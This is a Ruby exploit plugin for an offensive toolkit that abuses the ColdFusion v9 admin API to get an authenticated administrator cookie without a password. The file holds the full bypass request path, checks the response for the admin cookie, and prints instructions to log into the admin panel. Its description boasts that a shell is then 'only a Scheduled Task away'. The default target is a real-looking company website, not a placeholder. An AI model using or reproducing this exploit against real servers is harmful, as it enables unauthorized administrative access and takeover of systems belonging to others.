# ColdFusion v9 Auth Bypass Exploit Plugin
#
# Abuse the API to grab authenticated cookie which can be used to access the general CF Admin panel afterwards, making a shell only a scheduled task away....
# PIC: http://i.imgur.com/h6XrLR9.png
#
###
# TO DO:
# Build Error Handling In
# (Errno::ECONNREFUSED)
#
class ColdFusionAuthBypass < Core::CoreShell
	def initialize
		#Basic Info:
		module_name='ColdFusionAuthBypass'
		module_info={
			'Name'        => 'Cold Fusion v9 Authentication Bypass Exploit',
			'Version'     => 'v0.01b',
			'Description' => "This sends a request which abuses the default CF API system in ColdFusion v9 Servers which allows 'remote' authentication via API. If system is vulnerable the authenticated Admin cookie is set in response which can be used to access the ColdFusion Admin Panel, making a shell only a Scheduled Task away!\n\tTarget => The target site running ColdFusion v9\n\tEX: http://www.example.com/\n\tEX: http://192.168.1.69:8080/",
			'Author'      => 'Hood3dRob1n'
		}

		module_required={ 'Target' => "http://www.taurususa.com/" } 
		module_optional={}
		@non_set_private_options={ 'ProxyIp' => 'nil', 'ProxyPort' => 'nil', 'Username' => 'nil', 'Password' => 'nil', 'Auth' => 0, 'Cookie' => 'nil' }

		if $module_name.nil?
			pluginRegistrar(module_name,module_info,module_required,module_optional)
		else
			cf_auth_bypass
		end
	end

	def cf_auth_bypass
		auth_bypass="/CFIDE/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true"
		admin="/CFIDE/administrator/enter.cfm"

		uri = URI("#{$module_required['Target'].sub(/\/$/, '')}#{auth_bypass}")
		rez = Net::HTTP.get_response(uri)
		if rez['set-cookie'] =~ /CFAUTHORIZATION_cfadmin=.+;/i
			puts "[".light_green + "*".white + "] w00t".light_green + " - ".white + "it worked".light_green + "!".white
			puts "[".light_green + "*".white + "] Authenticated Cookie".light_green + ": \n#{rez['set-cookie']}".white
			puts "[".light_green + "*".white + "] Try logging in with it at the admin page now".light_green + ": \nhttp://#{uri.host}/#{admin}\n".white
			puts "Enjoy".light_green + "!\n".white
		else
			puts "[".light_red + "X".white + "] Epic Fail ".light_red + "-".white + " not working! :(\n\n".light_red
		end
	end
end

ColdFusionAuthBypass.new
